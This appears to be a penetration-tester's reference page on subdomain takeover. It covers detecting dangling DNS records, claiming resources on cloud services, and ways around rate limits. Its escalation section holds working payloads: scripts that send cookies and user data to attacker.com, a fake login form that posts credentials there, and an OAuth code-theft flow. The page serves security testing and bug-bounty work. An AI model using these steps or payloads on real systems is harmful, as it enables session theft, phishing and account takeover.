---
tags:
  - high
  - infra
---

# Subdomain Takeover

A DNS record points to a resource that no longer exists. Claim the resource to control the subdomain, enabling cookie theft, phishing, and XSS on the parent domain.

## TL;DR

```bash
# Find dangling CNAME
dig +short CNAME blog.target.com
# Returns: target.ghost.io

# Check if claimable
curl https://blog.target.com
# "The thing you were looking for is no longer here"

# Claim the resource
# Create Ghost site with hostname: blog.target.com
# Now you control blog.target.com
```

## How It Works

**The vulnerability chain:**

1. **DNS Setup** - Company creates subdomain: `blog.target.com CNAME → myblog.cloudprovider.com`
2. **Resource Deleted** - Company deletes cloud resource (myblog.cloudprovider.com) but forgets DNS record
3. **DNS Dangling** - `blog.target.com` still points to non-existent resource
4. **Attacker Claims** - Attacker registers `myblog.cloudprovider.com` on the same service
5. **Takeover Complete** - Attacker now controls `blog.target.com`

**Why it's critical:**

- **Cookie Access** - If cookies set on `*.target.com`, attacker can read them
- **OAuth Redirect** - Controlled subdomain used as `redirect_uri` for token theft
- **Phishing** - Legitimate subdomain used for credential harvesting
- **XSS** - Script on subdomain can attack parent domain
- **Trust Abuse** - Users trust `target.com` subdomains

## Detection

### DNS Reconnaissance

```bash
# Enumerate subdomains
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o subdomains.txt

# Check for HTTP status
cat subdomains.txt | httpx -status-code -title -tech-detect -o http-results.txt

# Extract CNAMEs
cat subdomains.txt | while read sub; do
  cname=$(dig +short CNAME "$sub" | head -1)
  if [ -n "$cname" ]; then
    echo "$sub -> $cname"
  fi
done | tee cnames.txt
```

### Automated Scanning

```bash
# Subjack - subdomain takeover detection
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -o vulnerable.txt -v

# Nuclei templates
nuclei -l subdomains.txt -t nuclei-templates/takeovers/ -o takeovers.txt

# SubOver
subover -l subdomains.txt -v
```

### Manual Fingerprinting

```bash
# Check CNAME chain
dig +short CNAME blog.target.com
dig +short A blog.target.com

# Full DNS trace
dig +trace blog.target.com

# Check NS delegation
dig +short NS sub.target.com
```

### Vulnerable Service Fingerprints

| Service | Error Message | Claimable |
|---------|---------------|-----------|
| **GitHub Pages** | `There isn't a GitHub Pages site here` | ✅ Yes |
| **Heroku** | `No such app` | ✅ Yes |
| **AWS S3** | `NoSuchBucket` | ✅ Yes (same region) |
| **Azure** | `NXDOMAIN` or `404 Not Found` | ✅ Yes |
| **Shopify** | `Sorry, this shop is currently unavailable` | ✅ Yes |
| **Fastly** | `Fastly error: unknown domain` | ✅ Yes |
| **Ghost** | `The thing you were looking for is no longer here` | ✅ Yes |
| **Tumblr** | `There's nothing here` | ✅ Yes |
| **WordPress.com** | `Do you want to register` | ✅ Yes |
| **Pantheon** | `404 error unknown site` | ✅ Yes |
| **Netlify** | Custom 404 or parking page | ⚠️ Sometimes |
| **CloudFront** | `Bad Request` / `ViewerCertificateException` | ✅ Yes |
| **Cargo** | `404: Not Found` | ✅ Yes |
| **Statuspage** | `You are being redirected` | ✅ Yes |
| **Surge.sh** | `project not found` | ✅ Yes |

## Exploitation

### CNAME to Third-Party Service

**GitHub Pages Takeover:**
```bash
# 1. Create GitHub repository
# 2. Add CNAME file to repo
echo "blog.target.com" > CNAME

# 3. Commit and push
git add CNAME
git commit -m "Add CNAME"
git push

# 4. Enable GitHub Pages
# Settings → Pages → Source: main branch

# 5. Verify
curl https://blog.target.com
```

**Heroku Takeover:**
```bash
# 1. Create Heroku app
heroku create my-app-name

# 2. Add custom domain
heroku domains:add blog.target.com -a my-app-name

# 3. Deploy simple PoC
echo "<h1>Subdomain Takeover PoC</h1>" > index.html
# (Deploy your app)

# 4. Verify
curl https://blog.target.com
```

**AWS S3 Takeover:**
```bash
# 1. Find bucket name from CNAME
# assets.target.com CNAME → assets-target.s3.amazonaws.com

# 2. Create bucket (same region!)
aws s3 mb s3://assets-target --region us-east-1

# 3. Enable static website hosting
aws s3 website s3://assets-target --index-document index.html

# 4. Upload PoC
echo "<h1>Subdomain Takeover PoC</h1>" > index.html
aws s3 cp index.html s3://assets-target/ --acl public-read

# 5. Verify
curl http://assets.target.com
```

**Azure Takeover:**
```bash
# 1. Create Azure Web App with custom domain
az webapp create --name myapp --resource-group mygroup

# 2. Add custom hostname
az webapp config hostname add \
  --webapp-name myapp \
  --resource-group mygroup \
  --hostname blog.target.com

# 3. Deploy PoC
# (Deploy your application)
```

### NS Delegation Takeover

```bash
# If subdomain uses NS delegation:
# sub.target.com NS → ns1.expired-domain.com

# 1. Check if domain expired
whois expired-domain.com

# 2. Register the expired domain
# (Purchase domain through registrar)

# 3. Setup authoritative DNS
# Now you control all DNS responses for sub.target.com

# 4. Create A record
sub.target.com. IN A 1.2.3.4

# Total control over subdomain DNS
```

### Wildcard CNAME Takeover

```bash
# If wildcard CNAME exists:
# *.target.com CNAME → target.cloudprovider.net

# Check multiple subdomains
curl https://anything.target.com
curl https://random123.target.com

# If all show same takeover fingerprint:
# → Claim base domain on service
# → Control ALL subdomains via wildcard
```

## Bypasses

### S3 Region Restrictions

```bash
# S3 buckets are region-specific
# Find original region from error message or trial

# Try each region
for region in us-east-1 us-west-1 us-west-2 eu-west-1; do
  aws s3 mb s3://bucket-name --region $region 2>&1
done
```

### Rate Limiting

```bash
# Some services rate-limit domain additions
# Use multiple accounts
# Wait between attempts
# Use VPN/proxy rotation
```

### Name Already Taken

```bash
# If exact name taken on service but subdomain still vulnerable:
# 1. Original owner may have deleted custom domain but kept account
# 2. Check if you can add custom domain to different resource
# 3. Try variations: dashes, underscores
# 4. Check if service allows domain on different plan/tier
```

## Escalation

### Cookie Theft

```javascript
// If cookies set on *.target.com (no HttpOnly flag)
// Controlled subdomain can access parent cookies

// On taken-over subdomain:
<script>
  // Exfiltrate cookies
  fetch('https://attacker.com/log?cookies=' + document.cookie);
  
  // Or set malicious cookies for parent
  document.cookie = "session=malicious; domain=.target.com; path=/";
</script>
```

### OAuth Redirect URI

```bash
# If subdomain whitelisted in OAuth redirect_uri:
# 1. Takeover subdomain: oauth-callback.target.com
# 2. Set it as OAuth redirect_uri
# 3. User authorizes app
# 4. Authorization code sent to controlled subdomain
# 5. Steal OAuth token

# Example OAuth flow:
https://oauth.provider.com/authorize?
  client_id=123&
  redirect_uri=https://oauth-callback.target.com&
  response_type=code

# After user authorizes:
# https://oauth-callback.target.com?code=AUTHORIZATION_CODE
# Attacker logs code
```

### Phishing Campaign

```html
<!-- Controlled subdomain: login.target.com -->
<!DOCTYPE html>
<html>
<head>
  <title>Target Login</title>
  <!-- Fake login page mimicking real target.com -->
</head>
<body>
  <form action="https://attacker.com/steal" method="POST">
    <input type="email" name="email" placeholder="Email">
    <input type="password" name="password" placeholder="Password">
    <button>Sign In</button>
  </form>
</body>
</html>

<!-- Email campaign: "Click here to reset password" -->
<!-- Link goes to login.target.com (legitimate subdomain) -->
<!-- Users trust it → enter credentials -->
```

### XSS to Parent Domain

```html
<!-- If parent domain allows scripts from subdomains -->
<!-- Controlled subdomain: cdn.target.com -->

<script>
  // XSS payload served from controlled subdomain
  // Executed in context of parent domain
  
  // Steal auth tokens
  fetch('https://target.com/api/user', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

### Certificate as Proof of Control

```bash
# Issue Let's Encrypt certificate for subdomain
# Proves domain control without visible defacement

certbot certonly --standalone -d blog.target.com

# Success means:
# 1. You control DNS (points to your server)
# 2. You control HTTP (served challenge file)
# 3. Irrefutable proof of takeover

# Show certificate in bug report
openssl x509 -in /etc/letsencrypt/live/blog.target.com/fullchain.pem -text -noout
```

## Pro Tips

- **CNAME > A Record** - Most takeovers are dangling CNAMEs, not A records
- **S3 Region Matters** - Must create bucket in same AWS region as original
- **NS Takeovers = Full Control** - Rare but most powerful (control entire DNS zone)
- **Certificate for Proof** - DV cert proves control without defacing site
- **Wildcard CNAMEs = Jackpot** - All subdomains vulnerable, not just one
- **Don't Abuse** - Minimal PoC only, no phishing/malware
- **Check Recursively** - CNAME may point to another CNAME (chain them)
- **Monitor Subdomains** - Set up alerts for when you find vulnerable ones
- **Read can-i-take-over-xyz** - Comprehensive reference for service-specific takeovers
- **Historical Subdomains** - Check archive.org for deleted but DNS-lingering subdomains

## References

- [can-i-take-over-xyz - Comprehensive Service List](https://github.com/EdOverflow/can-i-take-over-xyz)
- [HackerOne: Subdomain Takeover Reports](https://hackerone.com/hacktivity?querystring=subdomain%20takeover)
- [Subjack - Subdomain Takeover Tool](https://github.com/haccer/subjack)
- [Nuclei Takeover Templates](https://github.com/projectdiscovery/nuclei-templates/tree/master/takeovers)
- [OWASP: Subdomain Takeover](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover)
